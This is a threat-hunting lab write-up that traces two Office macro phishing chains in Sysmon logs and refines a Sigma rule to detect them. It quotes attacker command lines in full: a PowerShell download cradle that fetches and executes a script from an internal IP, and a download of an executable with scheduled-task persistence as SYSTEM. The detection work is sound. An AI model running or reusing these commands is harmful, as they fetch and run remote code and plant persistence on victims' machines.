# Threat Hunt: Macro-Based Phishing via Office Documents

> **Focus:** Macro execution leading to command execution and persistence  
> **Data:** Windows Event Logs (Sysmon)  
> **Tooling:** Chainsaw, Sigma  

---

I was provided with a set of Windows event logs containing two phishing attempts delivered through different Microsoft Office documents. 
Both cases relied on malicious macro execution, but used different execution paths after initial access.

The goal was to identify the macro-driven behavior in each case and produce a Sigma rule capable of detecting both scenarios reliably.

---

I began with a provided Sigma rule intended to detect macro phishing by looking for suspicious parent-child process relationships originating from Microsoft Word.

```yaml
title: Detecting Macro Phishing
status: test
description: Detecting macro phishing using suspicious parent-child process relationship
author: Cyber5W
tags:
    - Phishing
logsource:
    product: windows
detection:
    selection:
        EventID: 1
        ParentImage|endswith: ['\WINWORD.EXE']
        OriginalFileName: ['cmd.exe']
        CommandLine|contains: ['cmd.exe']
    condition: selection
falsepositives:
    - Unknown
level: High
```

Using this rule with Chainsaw against the provided event logs produced a single detection. 
```cmd
.\chainsaw.exe hunt C:\Users\Administrator\Downloads\All-Files\Lab1\Lab1 -s .\myrules\Example1.yml --mapping .\mappings\sigma-event-logs-all.yml
```
<img width="585" height="99" alt="macro_phishing_inital_detections_one_doc" src="https://github.com/user-attachments/assets/7235adfa-6542-495e-b350-85b65e8a50b2" /> 

The detection occurred at `2024-04-01 15:07:13` UTC and corresponded to a Sysmon Event ID 1 (Process Creation). 

<img width="1478" height="311" alt="macro_phishing_inital_detections" src="https://github.com/user-attachments/assets/5a9a9cce-18be-497e-b1e4-260a0e619bb9" /> 
<img width="1045" height="453" alt="macro_phishing_inital_detections_event_viewer" src="https://github.com/user-attachments/assets/271b36fb-0f3e-4bf5-bf48-8b1907ef7897" />


--- 

Reviewing the event in Event Viewer showed `WINWORD.EXE` spawning `cmd.exe`, which then launched `powershell.exe`. 
The PowerShell process executed a download cradle attempting to retrieve a VBScript file from an internal IP address. 

```cmd
"C:\Windows\System32\cmd.exe" /c start /min "" 
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
-WindowStyle Hidden 
-ExecutionPolicy Bypass 
-command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.155/second.vbs')"
```

At this point, I attempted to pivot on the two available indicators: 
- `192.168.1.155`
- `second.vbs`

However, the provided event logs didn't contain additional evidence of the VBScript being written to disk, executed, or referenced in later process creation events. 
No file creation or follow-on execution could be confirmed from the dataset. 

This appeared to be a complete picture of the first macro execution chain. 

--- 

Since I knew that *two* phishing attempts were explicitly mentioned, I revisited the original Sigma rule and noticed that the detection logic was tightly scoped to:

- Microsoft Word as the parent process

- `cmd.exe` as the only child process (Image) of interest

To accomodate other possibilities, I extended the detection to include `powershell.exe` as well as `EXCEL.exe` as the attack vector. 
```yaml
title: Detecting Macro Phishing
status: test
description: Detecting macro phishing using suspicious parent-child process relationship
author: 
tags:
    - Phishing
logsource:
    product: windows
detection:
    selection:
        EventID: 1
        ParentImage|endswith: ['\WINWORD.EXE', '\EXCEL.EXE']
        OriginalFileName: ['cmd.exe', 'powershell.exe']
        CommandLine|contains: ['cmd.exe', 'powershell.exe']
    condition: selection
falsepositives:
    - Unknown
level: High
```
Running Chainsaw again with the updated rule surfaced a second detection at `2024-04-01 13:14:40` UTC, predating the original incident.

This time, the parent process was `EXCEL.EXE`. 

<img width="1471" height="313" alt="macro_phishing_modified_detection" src="https://github.com/user-attachments/assets/dd9706ee-d776-4678-bf93-efdfc7e1f54f" /> 
<img width="1055" height="478" alt="macro_phishing_modified_detection_event_viewer" src="https://github.com/user-attachments/assets/d1d841d4-f846-4f4a-954e-567c82bd9d0f" />


--- 

The command line associated with this execution showed a more complete attack chain. The macro-triggered PowerShell process downloaded an executable and immediately established persistence via a scheduled task. 
```cmd
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
-ExecutionPolicy Bypass 
-Command "$url = 'http://192.168.1.125/tas.exe'; 
$outputPath = 'C:\ProgramData\tas.exe'; 
Invoke-WebRequest -Uri $url -OutFile $outputPath; 
schtasks /Create /TN MyServiceTask /TR '$outputPath' /SC ONSTART /RU SYSTEM"
```

This provided several strong indicators:

- Download of `tas.exe`
- Persistence via scheduled task (`MyServiceTask`)
- Execution configured as `SYSTEM` on startup

--- 

As with the first document, I attempted to pivot on the newly identified indicators. However, the event log sample didn't contain any evidence of `tas.exe` execution, file creation events for `tas.exe` or
subsequent scheduled task execution.

The dataset appears intentionally limited to the macro execution phase.  

--- 

## Timeline

### 2024-04-01 13:14:40 UTC
- `EXCEL.EXE` executes a malicious macro
- Macro launches `powershell.exe` with execution policy bypass
- PowerShell downloads `tas.exe` from `http://192.168.1.125`
- A scheduled task named `MyServiceTask` is created
- Task configured to execute `C:\ProgramData\tas.exe` on system startup as `SYSTEM`

### 2024-04-01 15:07:13 UTC
- `WINWORD.EXE` executes a malicious macro
- Macro launches `cmd.exe`
- `cmd.exe` spawns `powershell.exe`
- PowerShell downloads `second.vbs` from `http://192.168.1.155`

### Post-Execution
- No file creation events observed for `tas.exe` or `second.vbs`
- No evidence of payload execution beyond initial macro-triggered activity
- No follow-on persistence, lateral movement, or privilege escalation observed in available logs

---

**Notes**
- Two separate macro-driven phishing chains were identified in the dataset
- Detection logic was adjusted to account for multiple Office-based delivery paths
- The timeline was reconstructed primarily from process creation telemetry
- Limited log coverage meant second-stage payload execution could not be fully validated

